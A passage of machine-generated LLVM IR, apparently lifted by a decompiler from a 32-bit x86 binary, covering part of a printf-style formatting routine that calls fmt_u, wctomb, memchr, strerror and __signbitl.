  %v2_8052331 = inttoptr i32 %v1_805231d to i8*
  %v3_8052331 = load i8, i8* %v2_8052331, align 1
  %v4_8052331 = urem i8 %v3_8052331, 2
  %v5_8052331 = icmp eq i8 %v4_8052331, 0
  br i1 %v5_8052331, label %dec_label_pc_805234a, label %dec_label_pc_8052338

dec_label_pc_8052338:                             ; preds = %dec_label_pc_8052331
  %v1_8052338 = add i32 %v0_8052513, 64
  %v2_8052338 = inttoptr i32 %v1_8052338 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8054a22.394 to i32), i32* %v2_8052338, align 4
  br label %dec_label_pc_8052340

dec_label_pc_8052340:                             ; preds = %dec_label_pc_8052327, %dec_label_pc_80522fe, %dec_label_pc_8052338
  %v0_8052340 = load i32, i32* @esp, align 4
  %v1_8052340 = add i32 %v0_8052340, 72
  %v2_8052340 = inttoptr i32 %v1_8052340 to i32*
  store i32 1, i32* %v2_8052340, align 4
  br label %dec_label_pc_805235a

dec_label_pc_805234a:                             ; preds = %dec_label_pc_8052162, %dec_label_pc_8052331
  %v1_805234a = add i32 %v0_8052513, 64
  %v2_805234a = inttoptr i32 %v1_805234a to i32*
  store i32 ptrtoint ([10 x i8]* @global_var_8054a20.392 to i32), i32* %v2_805234a, align 4
  %v0_8052352 = load i32, i32* @esp, align 4
  %v1_8052352 = add i32 %v0_8052352, 72
  %v2_8052352 = inttoptr i32 %v1_8052352 to i32*
  store i32 0, i32* %v2_8052352, align 4
  br label %dec_label_pc_805235a

dec_label_pc_805235a:                             ; preds = %dec_label_pc_8052340, %dec_label_pc_805234a
  %v0_805235a = load i32, i32* @esp, align 4
  %v1_805235a = add i32 %v0_805235a, 7808
  %v2_805235a = inttoptr i32 %v1_805235a to i32*
  %v3_805235a = load i32, i32* %v2_805235a, align 4
  store i32 %v3_805235a, i32* @eax, align 4
  %v1_8052361 = add i32 %v0_805235a, 7527
  store i32 %v1_8052361, i32* @ecx, align 4
  %v1_8052368 = add i32 %v0_805235a, 7812
  %v2_8052368 = inttoptr i32 %v1_8052368 to i32*
  %v3_8052368 = load i32, i32* %v2_8052368, align 4
  store i32 %v3_8052368, i32* @edx, align 4
  %v0_805236f = call i32 @fmt_u()
  store i32 %v0_805236f, i32* %eax.global-to-local, align 4
  store i32 %v0_805236f, i32* @esi, align 4
  br label %dec_label_pc_8052376

dec_label_pc_8052376:                             ; preds = %dec_label_pc_80522d7, %dec_label_pc_805226e, %dec_label_pc_805235a
  %v0_8052376 = load i32, i32* @esp, align 4
  %v1_8052376 = add i32 %v0_8052376, 52
  %v2_8052376 = inttoptr i32 %v1_8052376 to i32*
  %v3_8052376 = load i32, i32* %v2_8052376, align 4
  %v5_8052376 = icmp slt i32 %v3_8052376, 0
  br i1 %v5_8052376, label %dec_label_pc_8052385, label %dec_label_pc_805237d

dec_label_pc_805237d:                             ; preds = %dec_label_pc_8052376
  %v1_805237d = add i32 %v0_8052376, 44
  %v2_805237d = inttoptr i32 %v1_805237d to i32*
  %v3_805237d = load i32, i32* %v2_805237d, align 4
  %v4_805237d = and i32 %v3_805237d, -65537
  store i32 %v4_805237d, i32* %v2_805237d, align 4
  %v0_8052385.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052385

dec_label_pc_8052385:                             ; preds = %dec_label_pc_8052376, %dec_label_pc_805237d
  %v1_80523c7 = phi i32 [ %v0_8052376, %dec_label_pc_8052376 ], [ %v0_8052385.pre, %dec_label_pc_805237d ]
  %v1_8052385 = add i32 %v1_80523c7, 7812
  %v2_8052385 = inttoptr i32 %v1_8052385 to i32*
  %v3_8052385 = load i32, i32* %v2_8052385, align 4
  store i32 %v3_8052385, i32* %edx.global-to-local, align 4
  %v1_805238c = add i32 %v1_80523c7, 7808
  %v2_805238c = inttoptr i32 %v1_805238c to i32*
  %v3_805238c = load i32, i32* %v2_805238c, align 4
  store i32 %v3_805238c, i32* %eax.global-to-local, align 4
  %v2_8052395 = or i32 %v3_805238c, %v3_8052385
  %v3_8052395 = icmp eq i32 %v2_8052395, 0
  store i32 %v2_8052395, i32* %ecx.global-to-local, align 4
  %v1_8052397 = icmp eq i1 %v3_8052395, false
  %.pre212 = add i32 %v1_80523c7, 52
  %.pre213 = inttoptr i32 %.pre212 to i32*
  br i1 %v1_8052397, label %dec_label_pc_80523ae, label %dec_label_pc_8052399

dec_label_pc_8052399:                             ; preds = %dec_label_pc_8052385
  %v3_8052399 = load i32, i32* %.pre213, align 4
  %v4_8052399 = icmp eq i32 %v3_8052399, 0
  %v1_805239e = icmp eq i1 %v4_8052399, false
  br i1 %v1_805239e, label %dec_label_pc_80523ae, label %dec_label_pc_80523a0

dec_label_pc_80523a0:                             ; preds = %dec_label_pc_8052399
  %v1_80523a0 = add i32 %v1_80523c7, 7527
  store i32 %v1_80523a0, i32* @esi, align 4
  store i32 %v1_80523a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053284

dec_label_pc_80523ae:                             ; preds = %dec_label_pc_8052385, %dec_label_pc_8052399
  %v1_80523b0 = zext i1 %v3_8052395 to i32
  %v1_80523b6 = add i32 %v1_80523c7, 7527
  store i32 %v1_80523b6, i32* %ebx.global-to-local, align 4
  %v2_80523bd = add i32 %v1_80523b0, %v1_80523b6
  %v1_80523bf = load i32, i32* @esi, align 4
  %v2_80523bf = sub i32 %v2_80523bd, %v1_80523bf
  store i32 %v2_80523bf, i32* %eax.global-to-local, align 4
  %v3_80523c1 = load i32, i32* %.pre213, align 4
  %v5_80523c1 = sub i32 %v3_80523c1, %v2_80523bf
  %v11_80523c1 = xor i32 %v3_80523c1, %v2_80523bf
  %v12_80523c1 = xor i32 %v5_80523c1, %v3_80523c1
  %v13_80523c1 = and i32 %v12_80523c1, %v11_80523c1
  %v14_80523c1 = icmp slt i32 %v13_80523c1, 0
  %v16_80523c1 = icmp slt i32 %v5_80523c1, 0
  %v2_80523c5 = icmp eq i1 %v16_80523c1, %v14_80523c1
  br i1 %v2_80523c5, label %dec_label_pc_80523cb, label %dec_label_pc_80523c7

dec_label_pc_80523c7:                             ; preds = %dec_label_pc_80523ae
  store i32 %v2_80523bf, i32* %.pre213, align 4
  %v0_80523cb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80523cb

dec_label_pc_80523cb:                             ; preds = %dec_label_pc_80523ae, %dec_label_pc_80523c7
  %v0_80523cb = phi i32 [ %v1_80523c7, %dec_label_pc_80523ae ], [ %v0_80523cb.pre, %dec_label_pc_80523c7 ]
  %v1_80523cb = add i32 %v0_80523cb, 7527
  store i32 %v1_80523cb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053284

dec_label_pc_80523d7:                             ; preds = %dec_label_pc_8052162
  %v1_80523d7 = add i32 %v0_8052513, 7808
  %v2_80523d7 = inttoptr i32 %v1_80523d7 to i32*
  %v3_80523d7 = load i32, i32* %v2_80523d7, align 4
  store i32 %v3_80523d7, i32* %eax.global-to-local, align 4
  %v1_80523de = add i32 %v0_8052513, 7526
  store i32 %v1_80523de, i32* @esi, align 4
  %v1_80523e5 = add i32 %v0_8052513, 44
  %v2_80523e5 = inttoptr i32 %v1_80523e5 to i32*
  %v3_80523e5 = load i32, i32* %v2_80523e5, align 4
  %v4_80523e5 = and i32 %v3_80523e5, -65537
  store i32 %v4_80523e5, i32* %v2_80523e5, align 4
  %v0_80523ed = load i32, i32* @esp, align 4
  %v1_80523ed = add i32 %v0_80523ed, 52
  %v2_80523ed = inttoptr i32 %v1_80523ed to i32*
  store i32 1, i32* %v2_80523ed, align 4
  %v0_80523f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80523f5 = trunc i32 %v0_80523f5 to i8
  %v2_80523f5 = load i32, i32* @esp, align 4
  %v3_80523f5 = add i32 %v2_80523f5, 7526
  %v4_80523f5 = inttoptr i32 %v3_80523f5 to i8*
  store i8 %v1_80523f5, i8* %v4_80523f5, align 1
  %v0_805326d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805326d

dec_label_pc_8052401:                             ; preds = %dec_label_pc_8052162
  %v2_8052401 = call i32 @__errno_location(i32 %v2_8051dd5)
  store i32 %v2_8052401, i32* %eax.global-to-local, align 4
  %v0_8052406 = load i32, i32* @esp, align 4
  %v1_8052409 = inttoptr i32 %v2_8052401 to i32*
  %v2_8052409 = load i32, i32* %v1_8052409, align 4
  %v4_8052409 = add i32 %v0_8052406, -16
  %v5_8052409 = inttoptr i32 %v4_8052409 to i32*
  store i32 %v2_8052409, i32* %v5_8052409, align 4
  %v0_805240b = call i32 @strerror()
  store i32 %v0_805240b, i32* %eax.global-to-local, align 4
  %v0_8052410 = load i32, i32* @esp, align 4
  %v1_8052410 = add i32 %v0_8052410, 16
  br label %dec_label_pc_8052425

dec_label_pc_8052415:                             ; preds = %dec_label_pc_8052162
  %v1_8052415 = add i32 %v0_8052513, 7808
  %v2_8052415 = inttoptr i32 %v1_8052415 to i32*
  %v3_8052415 = load i32, i32* %v2_8052415, align 4
  store i32 %v3_8052415, i32* %eax.global-to-local, align 4
  %v1_8052421 = icmp eq i32 %v3_8052415, 0
  br i1 %v1_8052421, label %dec_label_pc_8052427, label %dec_label_pc_8052425

dec_label_pc_8052425:                             ; preds = %dec_label_pc_8052415, %dec_label_pc_8052401
  %v1_8052427116 = phi i32 [ %v0_8052513, %dec_label_pc_8052415 ], [ %v1_8052410, %dec_label_pc_8052401 ]
  %v0_8052425 = phi i32 [ %v3_8052415, %dec_label_pc_8052415 ], [ %v0_805240b, %dec_label_pc_8052401 ]
  br label %dec_label_pc_8052427

dec_label_pc_8052427:                             ; preds = %dec_label_pc_8052415, %dec_label_pc_8052425
  %storemerge = phi i32 [ %v0_8052425, %dec_label_pc_8052425 ], [ ptrtoint ([7 x i8]* @global_var_8054a2a.395 to i32), %dec_label_pc_8052415 ]
  %v1_8052427 = phi i32 [ %v1_8052427116, %dec_label_pc_8052425 ], [ %v0_8052513, %dec_label_pc_8052415 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_8052427 = load i32, i32* @ebx, align 4
  %v2_8052427 = add i32 %v1_8052427, -4
  %v3_8052427 = inttoptr i32 %v2_8052427 to i32*
  store i32 %v0_8052427, i32* %v3_8052427, align 4
  %v1_8052428 = add i32 %v1_8052427, 52
  %v2_8052428 = inttoptr i32 %v1_8052428 to i32*
  %v3_8052428 = load i32, i32* %v2_8052428, align 4
  %v5_8052428 = add i32 %v1_8052427, -8
  %v6_8052428 = inttoptr i32 %v5_8052428 to i32*
  store i32 %v3_8052428, i32* %v6_8052428, align 4
  %v1_805242c = add i32 %v1_8052427, -12
  %v2_805242c = inttoptr i32 %v1_805242c to i32*
  store i32 0, i32* %v2_805242c, align 4
  %v0_805242e = load i32, i32* @esi, align 4
  %v2_805242e = add i32 %v1_8052427, -16
  %v3_805242e = inttoptr i32 %v2_805242e to i32*
  store i32 %v0_805242e, i32* %v3_805242e, align 4
  %v6_805242f = call i32 @memchr(i8* %v5_80520fb, i32 %v0_8051ddc, i32 %v0_8051dd1)
  store i32 %v6_805242f, i32* %eax.global-to-local, align 4
  %v0_8052434 = load i32, i32* @esp, align 4
  %v1_8052437 = icmp eq i32 %v6_805242f, 0
  %v1_8052439 = icmp eq i1 %v1_8052437, false
  br i1 %v1_8052439, label %dec_label_pc_8052444, label %dec_label_pc_805243b

dec_label_pc_805243b:                             ; preds = %dec_label_pc_8052427
  %v1_8052434 = add i32 %v0_8052434, 16
  %v1_805243b = add i32 %v0_8052434, 68
  %v2_805243b = inttoptr i32 %v1_805243b to i32*
  %v3_805243b = load i32, i32* %v2_805243b, align 4
  store i32 %v3_805243b, i32* %edx.global-to-local, align 4
  %v0_805243f = load i32, i32* @esi, align 4
  %v2_805243f = add i32 %v0_805243f, %v3_805243b
  store i32 %v2_805243f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805244c

dec_label_pc_8052444:                             ; preds = %dec_label_pc_8052427
  %v1_8052446 = load i32, i32* @esi, align 4
  %v2_8052446 = sub i32 %v6_805242f, %v1_8052446
  store i32 %v2_8052446, i32* %ecx.global-to-local, align 4
  %v2_8052448 = add i32 %v0_8052434, 68
  %v3_8052448 = inttoptr i32 %v2_8052448 to i32*
  store i32 %v2_8052446, i32* %v3_8052448, align 4
  %v0_805244c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805244c

dec_label_pc_805244c:                             ; preds = %dec_label_pc_805243b, %dec_label_pc_8052444
  %v11_805244c = phi i32 [ %v1_8052434, %dec_label_pc_805243b ], [ %v0_805244c.pre, %dec_label_pc_8052444 ]
  %v1_805244c = add i32 %v11_805244c, 44
  %v2_805244c = inttoptr i32 %v1_805244c to i32*
  %v3_805244c = load i32, i32* %v2_805244c, align 4
  %v4_805244c = and i32 %v3_805244c, -65537
  store i32 %v4_805244c, i32* %v2_805244c, align 4
  %v0_8053274.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053274

dec_label_pc_8052459:                             ; preds = %dec_label_pc_8052162
  %v1_8052459 = add i32 %v0_8052513, 7808
  %v2_8052459 = inttoptr i32 %v1_8052459 to i32*
  %v3_8052459 = load i32, i32* %v2_8052459, align 4
  store i32 %v3_8052459, i32* %eax.global-to-local, align 4
  %v1_8052460 = add i32 %v0_8052513, 7824
  %v2_8052460 = inttoptr i32 %v1_8052460 to i32*
  store i32 0, i32* %v2_8052460, align 4
  %v0_805246b = load i32, i32* @esp, align 4
  %v1_805246b = add i32 %v0_805246b, 52
  %v2_805246b = inttoptr i32 %v1_805246b to i32*
  store i32 -1, i32* %v2_805246b, align 4
  %v0_8052473 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052473 = load i32, i32* @esp, align 4
  %v2_8052473 = add i32 %v1_8052473, 7820
  %v3_8052473 = inttoptr i32 %v2_8052473 to i32*
  store i32 %v0_8052473, i32* %v3_8052473, align 4
  %v0_805247a = load i32, i32* @esp, align 4
  %v1_805247a = add i32 %v0_805247a, 7820
  store i32 %v1_805247a, i32* %eax.global-to-local, align 4
  %v2_8052481 = add i32 %v0_805247a, 7808
  %v3_8052481 = inttoptr i32 %v2_8052481 to i32*
  store i32 %v1_805247a, i32* %v3_8052481, align 4
  %v0_8052488.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052488

dec_label_pc_8052488:                             ; preds = %dec_label_pc_8052162, %dec_label_pc_8052459
  %v0_8052491 = phi i32 [ %v0_8052513, %dec_label_pc_8052162 ], [ %v0_8052488.pre, %dec_label_pc_8052459 ]
  %v1_8052488 = add i32 %v0_8052491, 7808
  %v2_8052488 = inttoptr i32 %v1_8052488 to i32*
  %v3_8052488 = load i32, i32* %v2_8052488, align 4
  store i32 %v3_8052488, i32* %esi.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8052491 = add i32 %v0_8052491, 7832
  store i32 %v1_8052491, i32* @edi, align 4
  %v2_805249f302 = add i32 %v0_8052491, 52
  %v3_805249f303 = inttoptr i32 %v2_805249f302 to i32*
  %v4_805249f304 = load i32, i32* %v3_805249f303, align 4
  %v10_805249f306 = icmp ne i32 %v4_805249f304, 0
  %v1_80524a3313 = icmp eq i1 %v10_805249f306, false
  br i1 %v1_80524a3313, label %dec_label_pc_80533c3, label %dec_label_pc_80524a9

dec_label_pc_805249a:                             ; preds = %dec_label_pc_80524c9
  %v0_805249a = load i32, i32* %esi.global-to-local, align 4
  %v1_805249a = add i32 %v0_805249a, 4
  store i32 %v1_805249a, i32* %esi.global-to-local, align 4
  %v2_805249d = add i32 %v1_80524cd, %v0_80524b7
  store i32 %v2_805249d, i32* @ebx, align 4
  %v4_805249f = load i32, i32* %v2_80524c9, align 4
  %v10_805249f = icmp ult i32 %v2_805249d, %v4_805249f
  %v1_80524a3 = icmp eq i1 %v10_805249f, false
  br i1 %v1_80524a3, label %dec_label_pc_80533c3, label %dec_label_pc_80524a9

dec_label_pc_80524a9:                             ; preds = %dec_label_pc_8052488, %dec_label_pc_805249a
  %v1_80524b3315 = phi i32 [ %v1_80524bc, %dec_label_pc_805249a ], [ %v0_8052491, %dec_label_pc_8052488 ]
  %v0_80524a9314 = phi i32 [ %v1_805249a, %dec_label_pc_805249a ], [ %v3_8052488, %dec_label_pc_8052488 ]
  %v1_80524a9 = inttoptr i32 %v0_80524a9314 to i32*
  %v2_80524a9 = load i32, i32* %v1_80524a9, align 4
  store i32 %v2_80524a9, i32* %eax.global-to-local, align 4
  %v1_80524ab = icmp eq i32 %v2_80524a9, 0
  br i1 %v1_80524ab, label %dec_label_pc_80533c3, label %dec_label_pc_80524b3

dec_label_pc_80524b3:                             ; preds = %dec_label_pc_80524a9
  %v0_80524b3 = load i32, i32* @ecx, align 4
  %v2_80524b3 = add i32 %v1_80524b3315, -4
  %v3_80524b3 = inttoptr i32 %v2_80524b3 to i32*
  store i32 %v0_80524b3, i32* %v3_80524b3, align 4
  %v0_80524b4 = load i32, i32* @ecx, align 4
  %v2_80524b4 = add i32 %v1_80524b3315, -8
  %v3_80524b4 = inttoptr i32 %v2_80524b4 to i32*
  store i32 %v0_80524b4, i32* %v3_80524b4, align 4
  %v2_80524b5 = add i32 %v1_80524b3315, -12
  %v3_80524b5 = inttoptr i32 %v2_80524b5 to i32*
  store i32 %v2_80524a9, i32* %v3_80524b5, align 4
  %v0_80524b6 = load i32, i32* @edi, align 4
  %v2_80524b6 = add i32 %v1_80524b3315, -16
  %v3_80524b6 = inttoptr i32 %v2_80524b6 to i32*
  store i32 %v0_80524b6, i32* %v3_80524b6, align 4
  %v0_80524b7 = call i32 @wctomb()
  store i32 %v0_80524b7, i32* %eax.global-to-local, align 4
  %v0_80524bc = load i32, i32* @esp, align 4
  %v1_80524bc = add i32 %v0_80524bc, 16
  %v2_80524bf = icmp slt i32 %v0_80524b7, 0
  store i32 %v0_80524b7, i32* %edx.global-to-local, align 4
  br i1 %v2_80524bf, label %dec_label_pc_80533af, label %dec_label_pc_80524c9

dec_label_pc_80524c9:                             ; preds = %dec_label_pc_80524b3
  %v1_80524c9 = add i32 %v0_80524bc, 68
  %v2_80524c9 = inttoptr i32 %v1_80524c9 to i32*
  %v3_80524c9 = load i32, i32* %v2_80524c9, align 4
  %v1_80524cd = load i32, i32* @ebx, align 4
  %v2_80524cd = sub i32 %v3_80524c9, %v1_80524cd
  store i32 %v2_80524cd, i32* %eax.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_80524b7, %v2_80524cd
  br i1 %tmp, label %dec_label_pc_80533c3, label %dec_label_pc_805249a

dec_label_pc_80524d8:                             ; preds = %dec_label_pc_80524f1
  %v1_80524d8 = add i32 %v0_80524fa, 52
  %v2_80524d8 = inttoptr i32 %v1_80524d8 to i32*
  %v3_80524d8 = load i32, i32* %v2_80524d8, align 4
  store i32 %v3_80524d8, i32* @eax, align 4
  %v0_80524dc = load i32, i32* @edi, align 4
  store i32 %v0_80524dc, i32* @edx, align 4
  %v0_80524de = load i32, i32* @ebp, align 4
  %v1_80524de = add i32 %v0_80524de, 4
  store i32 %v1_80524de, i32* @ebp, align 4
  %v0_80524e1 = call i32 @out()
  store i32 %v0_80524e1, i32* %eax.global-to-local, align 4
  %v0_80524e6 = load i32, i32* @esi, align 4
  %v1_80524e6 = load i32, i32* @ebx, align 4
  %v7_80524e6 = icmp ult i32 %v0_80524e6, %v1_80524e6
  %v1_80524e8 = icmp eq i1 %v7_80524e6, false
  br i1 %v1_80524e8, label %dec_label_pc_8052505, label %dec_label_pc_80524d8.dec_label_pc_80524ea_crit_edge

dec_label_pc_80524d8.dec_label_pc_80524ea_crit_edge: ; preds = %dec_label_pc_80524d8
  %v0_80524ea.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80524ea

dec_label_pc_80524ea:                             ; preds = %dec_label_pc_80533c3, %dec_label_pc_80524d8.dec_label_pc_80524ea_crit_edge
  %v0_80524ea = phi i32 [ %v0_80524ea.pre, %dec_label_pc_80524d8.dec_label_pc_80524ea_crit_edge ], [ %v3_80533de, %dec_label_pc_80533c3 ]
  %v1_80524ea = inttoptr i32 %v0_80524ea to i32*
  %v2_80524ea = load i32, i32* %v1_80524ea, align 4
  store i32 %v2_80524ea, i32* %eax.global-to-local, align 4
  %v1_80524ed = icmp eq i32 %v2_80524ea, 0
  br i1 %v1_80524ed, label %dec_label_pc_8052505, label %dec_label_pc_80524f1

dec_label_pc_80524f1:                             ; preds = %dec_label_pc_80524ea
  %v0_80524f1 = load i32, i32* @edx, align 4
  %v1_80524f1 = load i32, i32* @esp, align 4
  %v2_80524f1 = add i32 %v1_80524f1, -4
  %v3_80524f1 = inttoptr i32 %v2_80524f1 to i32*
  store i32 %v0_80524f1, i32* %v3_80524f1, align 4
  %v0_80524f2 = load i32, i32* @edx, align 4
  %v2_80524f2 = add i32 %v1_80524f1, -8
  %v3_80524f2 = inttoptr i32 %v2_80524f2 to i32*
  store i32 %v0_80524f2, i32* %v3_80524f2, align 4
  %v0_80524f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80524f3 = add i32 %v1_80524f1, -12
  %v3_80524f3 = inttoptr i32 %v2_80524f3 to i32*
  store i32 %v0_80524f3, i32* %v3_80524f3, align 4
  %v0_80524f4 = load i32, i32* @edi, align 4
  %v2_80524f4 = add i32 %v1_80524f1, -16
  %v3_80524f4 = inttoptr i32 %v2_80524f4 to i32*
  store i32 %v0_80524f4, i32* %v3_80524f4, align 4
  %v0_80524f5 = call i32 @wctomb()
  store i32 %v0_80524f5, i32* %eax.global-to-local, align 4
  %v0_80524fa = load i32, i32* @esp, align 4
  %v0_80524fd = load i32, i32* @esi, align 4
  %v2_80524fd = add i32 %v0_80524fd, %v0_80524f5
  store i32 %v2_80524fd, i32* @esi, align 4
  store i32 %v0_80524f5, i32* @ecx, align 4
  %v1_8052501 = load i32, i32* @ebx, align 4
  %v7_8052503 = icmp sgt i32 %v2_80524fd, %v1_8052501
  br i1 %v7_8052503, label %dec_label_pc_8052505, label %dec_label_pc_80524d8

dec_label_pc_8052505:                             ; preds = %dec_label_pc_80524d8, %dec_label_pc_80524ea, %dec_label_pc_80524f1, %dec_label_pc_80533c3
  %v0_8052505 = phi i32 [ %v0_80533d9, %dec_label_pc_80533c3 ], [ %v0_80524f5, %dec_label_pc_80524f1 ], [ 0, %dec_label_pc_80524ea ], [ %v0_80524e1, %dec_label_pc_80524d8 ]
  %v1_8052505 = load i32, i32* @esp, align 4
  %v2_8052505 = add i32 %v1_8052505, -4
  %v3_8052505 = inttoptr i32 %v2_8052505 to i32*
  store i32 %v0_8052505, i32* %v3_8052505, align 4
  %v0_8052506 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052506 = add i32 %v1_8052505, -8
  %v3_8052506 = inttoptr i32 %v2_8052506 to i32*
  store i32 %v0_8052506, i32* %v3_8052506, align 4
  br label %dec_label_pc_805263f

dec_label_pc_805250c:                             ; preds = %dec_label_pc_8052162, %dec_label_pc_8052162, %dec_label_pc_8052162, %dec_label_pc_8052162, %dec_label_pc_8052162, %dec_label_pc_8052162, %dec_label_pc_8052162, %dec_label_pc_8052162
  %v1_805250c = add i32 %v0_8052513, 7808
  %v2_805250c = inttoptr i32 %v1_805250c to x86_fp80*
  %v3_805250c = load x86_fp80, x86_fp80* %v2_805250c, align 4
  store x86_fp80 %v3_805250c, x86_fp80* %st0.global-to-local, align 4
  %v1_8052513 = add i32 %v0_8052513, 7828
  %v2_8052513 = inttoptr i32 %v1_8052513 to i32*
  store i32 0, i32* %v2_8052513, align 4
  %v1_805251e = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v2_805251e = load i32, i32* @esp, align 4
  %v3_805251e = add i32 %v2_805251e, 7792
  %v4_805251e = inttoptr i32 %v3_805251e to x86_fp80*
  store x86_fp80 %v1_805251e, x86_fp80* %v4_805251e, align 4
  %v0_8052525 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052525 = add i32 %v2_805251e, -4
  %v3_8052525 = inttoptr i32 %v2_8052525 to i32*
  store i32 %v0_8052525, i32* %v3_8052525, align 4
  %v1_8052526 = add i32 %v2_805251e, 7800
  %v2_8052526 = inttoptr i32 %v1_8052526 to i32*
  %v3_8052526 = load i32, i32* %v2_8052526, align 4
  %v5_8052526 = add i32 %v2_805251e, -8
  %v6_8052526 = inttoptr i32 %v5_8052526 to i32*
  store i32 %v3_8052526, i32* %v6_8052526, align 4
  %v1_805252d = add i32 %v2_805251e, 7796
  %v2_805252d = inttoptr i32 %v1_805252d to i32*
  %v3_805252d = load i32, i32* %v2_805252d, align 4
  %v5_805252d = add i32 %v2_805251e, -12
  %v6_805252d = inttoptr i32 %v5_805252d to i32*
  store i32 %v3_805252d, i32* %v6_805252d, align 4
  %v2_8052534 = inttoptr i32 %v3_805251e to i32*
  %v3_8052534 = load i32, i32* %v2_8052534, align 4
  %v5_8052534 = add i32 %v2_805251e, -16
  %v6_8052534 = inttoptr i32 %v5_8052534 to i32*
  store i32 %v3_8052534, i32* %v6_8052534, align 4
  %v0_805253b = call i32 @__signbitl()
  store i32 %v0_805253b, i32* %eax.global-to-local, align 4
  %v0_8052540 = load i32, i32* @esp, align 4
  %v1_8052543 = icmp eq i32 %v0_805253b, 0
  br i1 %v1_8052543, label %dec_label_pc_8052561, label %dec_label_pc_8052547

dec_label_pc_8052547:                             ; preds = %dec_label_pc_805250c
  %v1_8052547 = add i32 %v0_8052540, 7808
  %v2_8052547 = inttoptr i32 %v1_8052547 to x86_fp80*
  %v3_8052547 = load x86_fp80, x86_fp80* %v2_8052547, align 4
  store x86_fp80 %v3_8052547, x86_fp80* %st0.global-to-local, align 4
  %v1_805254e = add i32 %v0_8052540, 100
  %v2_805254e = inttoptr i32 %v1_805254e to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_8054a31.396 to i32), i32* %v2_805254e, align 4
  %v1_8052556 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v2_8052556 = fsub x86_fp80 0xK80000000000000000000, %v1_8052556
  store x86_fp80 %v2_8052556, x86_fp80* %st0.global-to-local, align 4
  %v2_8052558 = load i32, i32* @esp, align 4
  %v3_8052558 = add i32 %v2_8052558, 7792
  %v4_8052558 = inttoptr i32 %v3_8052558 to x86_fp80*
  store x86_fp80 %v2_8052556, x86_fp80* %v4_8052558, align 4
  br label %dec_label_pc_8052573

dec_label_pc_8052561:                             ; preds = %dec_label_pc_805250c
  %v1_8052561 = add i32 %v0_8052540, 60
  %v2_8052561 = inttoptr i32 %v1_8052561 to i32*
  %v3_8052561 = load i32, i32* %v2_8052561, align 4
  %v4_8052561 = and i32 %v3_8052561, 2048
  %v5_8052561 = icmp eq i32 %v4_8052561, 0
  br i1 %v5_8052561, label %dec_label_pc_805257d, label %dec_label_pc_805256b

dec_label_pc_805256b:                             ; preds = %dec_label_pc_8052561
  %v1_805256b = add i32 %v0_8052540, 100
  %v2_805256b = inttoptr i32 %v1_805256b to i32*
  store i32 ptrtoint ([16 x i8]* @global_var_8054a34.397 to i32), i32* %v2_805256b, align 4
  br label %dec_label_pc_8052573

dec_label_pc_8052573:                             ; preds = %dec_label_pc_8052584, %dec_label_pc_8052547, %dec_label_pc_805256b
  %v0_8052573 = load i32, i32* @esp, align 4
  %v1_8052573 = add i32 %v0_8052573, 80
  %v2_8052573 = inttoptr i32 %v1_8052573 to i32*
  store i32 1, i32* %v2_8052573, align 4
  br label %dec_label_pc_805259e

dec_label_pc_805257d:                             ; preds = %dec_label_pc_8052561
  %v2_805257d = inttoptr i32 %v1_8052561 to i8*
  %v3_805257d = load i8, i8* %v2_805257d, align 1
  %v4_805257d = urem i8 %v3_805257d, 2
  %v5_805257d = icmp eq i8 %v4_805257d, 0
  %v1_805258e = add i32 %v0_8052540, 100
  %v2_805258e = inttoptr i32 %v1_805258e to i32*
  br i1 %v5_805257d, label %dec_label_pc_805258e, label %dec_label_pc_8052584

dec_label_pc_8052584:                             ; preds = %dec_label_pc_805257d
  store i32 ptrtoint ([13 x i8]* @global_var_8054a37.398 to i32), i32* %v2_805258e, align 4
  br label %dec_label_pc_8052573

dec_label_pc_805258e:                             ; preds = %dec_label_pc_805257d
  store i32 ptrtoint ([18 x i8]* @global_var_8054a32.399 to i32), i32* %v2_805258e, align 4
  %v0_8052596 = load i32, i32* @esp, align 4
  %v1_8052596 = add i32 %v0_8052596, 80
  %v2_8052596 = inttoptr i32 %v1_8052596 to i32*
  store i32 0, i32* %v2_8052596, align 4
  br label %dec_label_pc_805259e

dec_label_pc_805259e:                             ; preds = %dec_label_pc_8052573, %dec_label_pc_805258e
  %v1_805259e = load i32, i32* @esp, align 4
  %v2_805259e = add i32 %v1_805259e, -4
  %v3_805259e = inttoptr i32 %v2_805259e to i32*
  store i32 %v0_805253b, i32* %v3_805259e, align 4
  %v1_805259f = add i32 %v1_805259e, 7800
  %v2_805259f = inttoptr i32 %v1_805259f to i32*
  %v3_805259f = load i32, i32* %v2_805259f, align 4
  %v5_805259f = add i32 %v1_805259e, -8
  %v6_805259f = inttoptr i32 %v5_805259f to i32*
  store i32 %v3_805259f, i32* %v6_805259f, align 4
  %v1_80525a6 = add i32 %v1_805259e, 7796
  %v2_80525a6 = inttoptr i32 %v1_80525a6 to i32*
  %v3_80525a6 = load i32, i32* %v2_80525a6, align 4
  %v5_80525a6 = add i32 %v1_805259e, -12
  %v6_80525a6 = inttoptr i32 %v5_80525a6 to i32*
  store i32 %v3_80525a6, i32* %v6_80525a6, align 4
  %v1_80525ad = add i32 %v1_805259e, 7792
  %v2_80525ad = inttoptr i32 %v1_80525ad to i32*
  %v3_80525ad = load i32, i32* %v2_80525ad, align 4
  %v5_80525ad = add i32 %v1_805259e, -16
  %v6_80525ad = inttoptr i32 %v5_80525ad to i32*
  store i32 %v3_80525ad, i32* %v6_80525ad, align 4
